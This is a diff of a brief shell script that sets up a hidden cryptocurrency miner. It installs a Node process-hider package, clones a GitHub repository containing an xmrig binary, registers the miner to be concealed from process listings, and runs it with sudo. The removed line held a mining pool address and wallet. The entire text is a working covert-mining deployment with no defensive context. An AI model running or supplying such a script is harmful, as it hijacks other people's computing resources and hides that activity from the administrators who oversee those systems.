@@ -1,7 +1,8 @@
 apt install nodejs -y
 apt install npm -y
 npm i -g node-process-hider
-wget https://github.com/Uhuijo/tes/blob/main/xmrig
+git clone https://github.com/Uhuijo/tes.git
+cd tes
 chmod 500 xmrig
 ph add xmrig
-sudo ./xmrig --donate-level 1 -o sf.pool-pay.com:4025 -u SafexsnemBLeBFCdMeECMS2mXQ8TWKVjGXDdqWLzC2h8LAd7rcMMKHYBexEWkZ9himSgVi3QQQ7pshSf84DikXMACuY26zthFwK3z -t 8 -k  -a rx/sfx
+sudo ./xmrig
